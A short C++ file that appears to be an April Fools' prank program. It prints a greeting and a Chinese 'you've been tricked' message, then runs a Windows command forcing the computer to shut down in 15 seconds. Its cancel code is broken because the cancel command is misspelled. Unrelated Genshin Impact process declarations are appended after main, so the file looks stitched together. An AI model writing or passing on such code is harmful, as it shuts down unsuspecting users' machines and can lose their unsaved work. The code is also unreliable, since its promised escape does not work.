#include <Windows.h>
#include <iostream>
#include <sstream>
#include <filesystem>


#include<stdio.h>
using namespace std;
int main(void)
{
	printf("Welcome to bcrepi!\n");
	printf("恭喜你，你被骗了，愚人节快乐！\n");
	{string s;
	system("shutdown -s -t 15");
	while(1){
		getline(cin, s);
		if (s == "999") {
			system("shutdow -a");
			break;
		}
	}

	}

	return 0;
}

const std::string GlobalGenshinProcName = "GenshinImpact.exe";
const std::string ChinaGenshinProcName = "YuanShen.exe";



bool OpenGenshinProcess(HANDLE* phProcess, HANDLE* phThread);

